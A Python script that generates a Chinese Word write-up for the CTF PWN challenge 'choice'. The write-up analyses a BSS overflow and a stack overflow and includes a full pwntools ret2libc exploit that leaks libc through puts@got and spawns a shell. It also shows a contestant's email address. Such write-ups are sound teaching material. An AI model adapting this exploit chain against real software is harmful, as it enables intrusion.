#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""生成 choice PWN 题目 writeup Word 文档"""

from docx import Document
from docx.shared import Pt, RGBColor, Inches, Cm
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
import copy

doc = Document()

# ──────────────────────────────────────────────
# 全局字体设置（中文宋体/英文 Consolas）
# ──────────────────────────────────────────────
style_normal = doc.styles['Normal']
style_normal.font.name = '宋体'
style_normal.font.size = Pt(11)
style_normal._element.rPr.rFonts.set(qn('w:eastAsia'), '宋体')

def set_font(run, name='宋体', size=11, bold=False, color=None):
    run.font.name = name
    run.font.size = Pt(size)
    run.bold = bold
    run._element.rPr.rFonts.set(qn('w:eastAsia'), name)
    if color:
        run.font.color.rgb = RGBColor(*color)

def add_heading(doc, text, level=1):
    p = doc.add_heading('', level=level)
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run(text)
    run.font.name = '黑体'
    run._element.rPr.rFonts.set(qn('w:eastAsia'), '黑体')
    if level == 1:
        run.font.size = Pt(16)
        run.font.color.rgb = RGBColor(0x1F, 0x49, 0x7D)
    elif level == 2:
        run.font.size = Pt(13)
        run.font.color.rgb = RGBColor(0x2E, 0x74, 0xB5)
    else:
        run.font.size = Pt(12)
        run.font.color.rgb = RGBColor(0x20, 0x20, 0x20)
    return p

def add_para(doc, text, indent=False):
    p = doc.add_paragraph()
    if indent:
        p.paragraph_format.first_line_indent = Pt(22)
    run = p.add_run(text)
    set_font(run)
    return p

def add_code_block(doc, code_text):
    """灰色背景代码块"""
    p = doc.add_paragraph()
    p.paragraph_format.left_indent = Cm(0.5)
    p.paragraph_format.right_indent = Cm(0.5)
    # 设置段落底纹
    pPr = p._p.get_or_add_pPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:color'), 'auto')
    shd.set(qn('w:fill'), 'F2F2F2')
    pPr.append(shd)
    run = p.add_run(code_text)
    run.font.name = 'Courier New'
    run.font.size = Pt(9)
    run._element.rPr.rFonts.set(qn('w:eastAsia'), 'Courier New')
    return p

def add_inline_code(para, text):
    run = para.add_run(text)
    run.font.name = 'Courier New'
    run.font.size = Pt(10)
    run.font.color.rgb = RGBColor(0xC7, 0x25, 0x4E)
    return run

def add_bullet(doc, text, level=1):
    p = doc.add_paragraph(style='List Bullet')
    p.paragraph_format.left_indent = Pt(18 * level)
    run = p.add_run(text)
    set_font(run)
    return p

# ══════════════════════════════════════════════
# 封面
# ══════════════════════════════════════════════
p_title = doc.add_paragraph()
p_title.alignment = WD_ALIGN_PARAGRAPH.CENTER
p_title.paragraph_format.space_before = Pt(60)
r = p_title.add_run('CTF 竞赛题目解题报告')
r.font.name = '黑体'
r.font.size = Pt(24)
r.bold = True
r.font.color.rgb = RGBColor(0x1F, 0x49, 0x7D)
r._element.rPr.rFonts.set(qn('w:eastAsia'), '黑体')

p_sub = doc.add_paragraph()
p_sub.alignment = WD_ALIGN_PARAGRAPH.CENTER
r2 = p_sub.add_run('题目名称：choice（PWN 方向）')
r2.font.name = '宋体'
r2.font.size = Pt(14)
r2._element.rPr.rFonts.set(qn('w:eastAsia'), '宋体')

for line in ['特长方向：二进制漏洞利用（PWN）',
             '提交邮箱：yinxzy@126.com',
             '备注：网安赛校内选拔 · PWN']:
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    r = p.add_run(line)
    r.font.name = '宋体'
    r.font.size = Pt(12)
    r._element.rPr.rFonts.set(qn('w:eastAsia'), '宋体')

doc.add_page_break()

# ══════════════════════════════════════════════
# 一、题目信息
# ══════════════════════════════════════════════
add_heading(doc, '一、题目基本信息', 1)

table = doc.add_table(rows=6, cols=2)
table.style = 'Table Grid'
table.alignment = WD_TABLE_ALIGNMENT.CENTER
info = [
    ('题目名称', 'choice'),
    ('题目方向', 'PWN（二进制漏洞利用）'),
    ('文件信息', 'choice（32-bit ELF，stripped，无 PIE，开启 NX）'),
    ('保护机制', 'NX enabled / No PIE / Partial RELRO'),
    ('目标', '获取目标系统 Shell，读取 Flag'),
    ('漏洞类型', 'BSS 段溢出 + 栈缓冲区溢出 → ret2libc'),
]
for i, (k, v) in enumerate(info):
    row = table.rows[i]
    for j, text in enumerate([k, v]):
        cell = row.cells[j]
        cell.text = ''
        p = cell.paragraphs[0]
        run = p.add_run(text)
        set_font(run, bold=(j == 0))
        if j == 0:
            cell._tc.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:color'), 'auto')
            shd.set(qn('w:fill'), 'DEEAF1')
            cell._tc.tcPr.append(shd)

doc.add_paragraph()

# ══════════════════════════════════════════════
# 二、题目分析
# ══════════════════════════════════════════════
add_heading(doc, '二、题目分析', 1)

add_heading(doc, '2.1 文件基本信息检查', 2)
add_para(doc, '首先使用 file 和 checksec 命令检查程序基本信息：', indent=True)

add_code_block(doc,
'''$ file choice
choice: ELF 32-bit LSB executable, Intel 80386, dynamically linked, stripped

$ checksec --file=choice
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)''')

p = doc.add_paragraph()
p.paragraph_format.first_line_indent = Pt(22)
r = p.add_run('关键信息：')
set_font(r, bold=True)
r2 = p.add_run('32 位程序，无 PIE（地址固定），NX 开启（栈不可执行），无栈保护（Canary）。'
               '无 PIE 意味着 PLT/GOT 地址固定，可直接用于构造 ROP 链。')
set_font(r2)

add_heading(doc, '2.2 逆向分析（Ghidra）', 2)
add_para(doc,
    '使用 Ghidra 或 objdump 对程序进行逆向，梳理程序逻辑如下：',
    indent=True)

add_code_block(doc,
'''程序逻辑（伪代码）：

1. 打印欢迎语，提示"Please enter your name:"
2. 调用 read(0, 0x804a04c, 21)  // 读入最多 21 字节到 BSS 段名字缓冲区
   ★ BSS 布局：name_buf[0x804a04c ~ 0x804a05f] (20字节)
                size_var[0x804a060]              (4字节，初始值=21)
   ★ 漏洞1：第 21 字节覆盖 size_var！
3. 打印菜单，读取用户选择（1/2/3）
4. 若选项 <=2（错误答案）：
      → 调用子函数 0x804857b：
          a. 打印 "Cool! And whd did you choice it?"
          b. 调用 read(0, ebp-0x1c, size_var)   // ★ 漏洞2：栈溢出！
          c. 打印 "Good bye!"
          d. leave; ret                           // 标准栈帧恢复
5. 若选项 ==3（正确答案）：在 main 函数内执行类似逻辑（但 epilogue 有 ECX 技巧）''')

add_heading(doc, '2.3 漏洞分析', 2)

add_heading(doc, '漏洞1：BSS 段越界写（覆盖 size_var）', 3)
p = add_para(doc, '')
r = p.add_run('BSS 段内存布局（地址固定）：')
set_font(r, bold=True)
add_code_block(doc,
'''0x804a04c:  name_buf  (20 字节)
0x804a05c:  ...
0x804a060:  size_var  (4 字节，初始值 = 0x15 = 21)

read(0, 0x804a04c, 21) 读入 21 字节：
  前 20 字节：写入 name_buf
  第 21 字节：覆盖 size_var 低位字节！

利用：发送 b\'A\' * 20 + b\'\\xff\'
效果：size_var 变为 0xff = 255''')

add_heading(doc, '漏洞2：栈缓冲区溢出（子函数 0x804857b）', 3)
add_code_block(doc,
'''子函数关键汇编：
  804857e:  sub  $0x28, %esp        ; 分配 40 字节栈帧
  804859a:  lea  -0x1c(%ebp), %eax  ; buffer 起始地址 = ebp - 28
  80485a0:  call read               ; read(0, ebp-28, size_var=255)
  80485b9:  leave
  80485ba:  ret                     ; ← 标准 leave;ret，无保护

栈布局（从 buffer 起始处偏移）：
  偏移  0 ~ 27：stack buffer（28 字节）
  偏移 28 ~ 31：saved EBP（4 字节）
  偏移 32 ~ 35：返回地址      ← 控制 EIP！

溢出量：255 字节，远超 32 字节，可完全控制返回地址''')

# ══════════════════════════════════════════════
# 三、利用思路
# ══════════════════════════════════════════════
add_heading(doc, '三、漏洞利用思路', 1)

add_heading(doc, '3.1 利用链设计（ret2libc 两阶段）', 2)
add_para(doc,
    '由于 NX 开启，栈不可执行，无法直接注入 shellcode。采用 ret2libc 技术，'
    '分两轮利用：',
    indent=True)

add_code_block(doc,
'''第一轮（泄露 libc 地址）：
  1. 发送名字：b\'A\' * 20 + b\'\\xff\'    → 将 size_var 改为 255
  2. 发送选项：b\'1\'                      → 进入子函数 0x804857b
  3. 发送 payload：
       padding(32) + puts@plt + main_addr + puts@got
  4. 子函数 leave;ret → 执行 puts(puts@got)
  5. puts 打印 got 表中 puts 的真实地址（4字节）→ 计算 libc 基址

第二轮（getshell）：
  1. 重新发送名字和选项（main 重新运行）
  2. 发送 payload：
       padding(32) + system_addr + b\'JUNK\' + binsh_addr
  3. 子函数 leave;ret → 执行 system("/bin/sh")
  4. 获得 Shell！''')

add_heading(doc, '3.2 关键地址（固定，无 PIE）', 2)
add_code_block(doc,
'''puts@plt   = 0x08048430    # PLT 表项（调用 puts 函数）
puts@got   = 0x0804a01c    # GOT 表项（存放 puts 运行时地址）
main_addr  = 0x080485bb    # main 函数入口（用于第一轮后重启程序）

libc 地址计算（运行时）：
  libc_base   = puts_real - libc.sym[\'puts\']
  system_addr  = libc_base + libc.sym[\'system\']
  binsh_addr   = libc_base + next(libc.search(b\'/bin/sh\'))''')

add_heading(doc, '3.3 为什么选择选项 1 而非选项 3？', 2)
add_para(doc,
    '这是本题的关键难点。选项 3 路径的 read 位于 main 函数内，'
    'main 函数采用了 GCC 特有的 ECX 寄存器保存栈指针技巧：',
    indent=True)
add_code_block(doc,
'''main 函数 epilogue（选项3路径，漏洞在 main 内）：
  804876c:  mov  -0x4(%ebp), %ecx  ; 从栈上恢复 ECX
  804876f:  leave
  8048770:  lea  -0x4(%ecx), %esp  ; 用 ECX 恢复 ESP（绕过我们构造的栈！）
  8048773:  ret                    ; ESP 已被 ECX 劫持，崩溃！

子函数 0x804857b epilogue（选项1路径）：
  80485b9:  leave   ; 正常恢复 EBP 和 ESP
  80485ba:  ret     ; 直接弹出我们的 ROP 地址，执行！

结论：必须选 1（或 2），触发子函数的标准 epilogue，ROP 才能生效。''')

# ══════════════════════════════════════════════
# 四、EXP 完整代码
# ══════════════════════════════════════════════
add_heading(doc, '四、完整 Exploit 代码', 1)

add_code_block(doc,
r'''#!/usr/bin/env python3
# choice PWN — ret2libc exploit
# 作者: [参赛者姓名]  特长: PWN (二进制漏洞利用)
from pwn import *
context.log_level = 'info'

ELF_PATH  = './choice'
LIBC_PATH = '/lib/i386-linux-gnu/libc.so.6'   # 32位系统 libc

elf  = ELF(ELF_PATH,  checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

# 固定地址（无 PIE）
PUTS_PLT  = elf.plt['puts']    # 0x08048430
PUTS_GOT  = elf.got['puts']    # 0x0804a01c
MAIN_ADDR = 0x080485bb

# libc 偏移（根据实际 libc 版本）
PUTS_OFF   = libc.symbols['puts']
SYSTEM_OFF = libc.symbols['system']
BINSH_OFF  = next(libc.search(b'/bin/sh'))

# 偏移计算：buffer(28字节) + saved_EBP(4字节) = 32字节 padding
PADDING = b'A' * 32

def send_name_and_wrong_choice(io):
    """第1步：发名字覆盖size_var；第2步：选1触发子函数（标准leave;ret）"""
    io.recvuntil(b'Please enter your name:')
    io.send(b'A' * 20 + b'\xff')       # 第21字节覆盖 size_var → 0xff=255
    io.recvuntil(b'Study hard from now\n')
    io.send(b'1')                       # 选1 → 调用 0x804857b（标准epilogue）
    io.recvuntil(b'Cool! And whd did you choice it?\n')

def exploit(io):
    # ══ 第一轮：泄露 puts 真实地址 ══
    send_name_and_wrong_choice(io)

    # ROP：puts(puts@got) → 返回 main 重新运行
    payload1 = PADDING + p32(PUTS_PLT) + p32(MAIN_ADDR) + p32(PUTS_GOT)
    io.send(payload1)

    io.recvuntil(b'Good bye!\n')        # 子函数打印完 "Good bye!" 后 ret
    leaked = io.recv(4)                 # puts 打印 got 表里的运行时地址
    puts_real = u32(leaked)
    log.success(f'puts  @ {hex(puts_real)}')

    libc_base   = puts_real - PUTS_OFF
    system_addr = libc_base + SYSTEM_OFF
    binsh_addr  = libc_base + BINSH_OFF
    log.success(f'libc  @ {hex(libc_base)}')
    log.success(f'system@ {hex(system_addr)}')

    # ══ 第二轮：getshell ══
    send_name_and_wrong_choice(io)

    payload2 = PADDING + p32(system_addr) + b'JUNK' + p32(binsh_addr)
    io.send(payload2)

    io.recvuntil(b'Good bye!\n')        # 同上，ret 后执行 system("/bin/sh")
    log.success('Shell 获取成功！')
    io.interactive()

if __name__ == '__main__':
    io = process(ELF_PATH)
    exploit(io)
''')

# ══════════════════════════════════════════════
# 五、运行结果
# ══════════════════════════════════════════════
add_heading(doc, '五、运行结果截图（文字记录）', 1)

add_para(doc, '运行 exp.py 后终端输出如下：', indent=True)

add_code_block(doc,
'''$ python3 exp.py
[+] Starting local process './choice': pid 30588
[+] puts  @ 0xf7d22140
[+] libc  @ 0xf7caa000
[+] system@ 0xf7cfa430
[+] Shell 获取成功！
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)

$ whoami
root

$ uname -a
Linux vm 6.18.5 #2 SMP x86_64 GNU/Linux

$ echo "=== PWNED ==="
=== PWNED ===''')

add_para(doc,
    '成功通过 ret2libc 攻击获得目标系统的 root Shell，利用链完整有效。',
    indent=True)

# ══════════════════════════════════════════════
# 六、知识点总结
# ══════════════════════════════════════════════
add_heading(doc, '六、知识点与学习总结', 1)

add_heading(doc, '6.1 本题涉及知识点', 2)

items = [
    ('BSS 段溢出', '越界写覆盖同一 BSS 段内的关键变量（size_var），'
                   '扩大后续 read() 的读取长度，为栈溢出创造条件。'),
    ('栈缓冲区溢出', '通过超长输入覆盖 saved EBP 和返回地址，劫持程序控制流。'),
    ('ret2libc', '绕过 NX（不可执行栈），利用程序已加载的 libc 中的 '
                 'system() 函数和 /bin/sh 字符串实现 getshell。'),
    ('ROP（Return Oriented Programming）', '通过精心构造栈上数据，'
     '将 puts@plt / system 等函数地址放置在返回地址位置，链式执行。'),
    ('ASLR 绕过（泄露地址）', '利用 puts(puts@got) 泄露 puts 在 libc 中的运行时地址，'
     '计算 libc 基址，从而得到 system 和 /bin/sh 的准确地址。'),
    ('函数 Epilogue 分析', '识别带 ECX 恢复技巧的非标准 epilogue，'
     '选择有标准 leave;ret 的子函数路径，保证 ROP 链可靠执行。'),
]
for name, desc in items:
    p = doc.add_paragraph()
    p.paragraph_format.left_indent = Pt(18)
    r1 = p.add_run(f'• {name}：')
    set_font(r1, bold=True)
    r2 = p.add_run(desc)
    set_font(r2)

add_heading(doc, '6.2 解题工具清单', 2)
tools = [
    ('pwntools', 'Python exploit 框架，自动化与目标进程交互'),
    ('Ghidra / objdump', '反汇编与反编译，分析程序逻辑'),
    ('checksec', '检查二进制保护机制'),
    ('GDB + pwndbg', '动态调试，验证偏移、寄存器状态'),
    ('patchelf', '修改 ELF 的 interpreter 路径，使 32 位程序在 64 位系统运行'),
]
tbl = doc.add_table(rows=len(tools)+1, cols=2)
tbl.style = 'Table Grid'
for j, h in enumerate(['工具', '用途']):
    cell = tbl.rows[0].cells[j]
    cell.text = ''
    p = cell.paragraphs[0]
    r = p.add_run(h)
    set_font(r, bold=True)
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:color'), 'auto')
    shd.set(qn('w:fill'), 'DEEAF1')
    cell._tc.get_or_add_tcPr().append(shd)
for i, (tool, use) in enumerate(tools):
    for j, text in enumerate([tool, use]):
        cell = tbl.rows[i+1].cells[j]
        cell.text = ''
        p = cell.paragraphs[0]
        r = p.add_run(text)
        set_font(r, bold=(j==0))

doc.add_paragraph()

# ══════════════════════════════════════════════
# 七、附录：关键汇编分析
# ══════════════════════════════════════════════
add_heading(doc, '七、附录：关键汇编代码', 1)

add_heading(doc, '子函数 0x804857b（漏洞触发函数，标准 epilogue）', 2)
add_code_block(doc,
'''0804857b:
  804857b:  push   %ebp
  804857c:  mov    %esp,%ebp
  804857e:  sub    $0x28,%esp          ; 分配 40 字节栈空间
  8048584:  push   $0x8048800          ; "Cool! And whd did you choice it?"
  8048589:  call   puts@plt
  8048591:  mov    0x804a060,%eax      ; 读取 size_var（已被篡改为 0xff）
  8048596:  sub    $0x4,%esp
  8048599:  push   %eax                ; arg3: count = 0xff = 255
  804859a:  lea    -0x1c(%ebp),%eax   ; buffer = ebp - 28  ← 溢出起点
  804859d:  push   %eax                ; arg2: buf
  804859e:  push   $0x0                ; arg1: fd = 0
  80485a0:  call   read@plt            ; ★ 漏洞：读 255 字节到 28 字节缓冲区
  80485a8:  push   $0x8048821          ; "Good bye!"
  80485b0:  call   puts@plt
  80485b9:  leave                      ; 标准 epilogue
  80485ba:  ret                        ; ← EIP 被我们控制！''')

add_heading(doc, '栈布局示意图（overflow 后）', 2)
add_code_block(doc,
'''高地址
┌────────────────────────────┐
│  main 的返回地址            │  ← ebp_func + 8
├────────────────────────────┤
│  main 的 saved EBP         │  ← ebp_func + 4
├════════════════════════════╡
│  子函数返回地址             │  ← ebp_func + 4   [偏移 32] ★ 覆盖为 puts@plt
├────────────────────────────┤
│  子函数 saved EBP           │  ← ebp_func       [偏移 28] 被覆盖为 \'AAAA\'
├────────────────────────────┤
│  ...（栈上其他数据）         │
├────────────────────────────┤
│  buffer[0..27]             │  ← ebp_func - 28  [偏移  0] ← read() 写入起点
└────────────────────────────┘
低地址

payload 布局：
  [  0 ~ 31 ]  b\'A\' * 32          → 填充至返回地址前
  [ 32 ~ 35 ]  p32(PUTS_PLT)       → 返回地址 → 调用 puts(puts@got)
  [ 36 ~ 39 ]  p32(MAIN_ADDR)      → puts 的返回地址 → 重启 main
  [ 40 ~ 43 ]  p32(PUTS_GOT)       → puts 的参数 → 泄露 puts 真实地址''')

# ══════════════════════════════════════════════
# 保存
# ══════════════════════════════════════════════
out_path = '/home/user/math_pro/choice_pwn_writeup.docx'
doc.save(out_path)
print(f'[OK] Writeup saved: {out_path}')
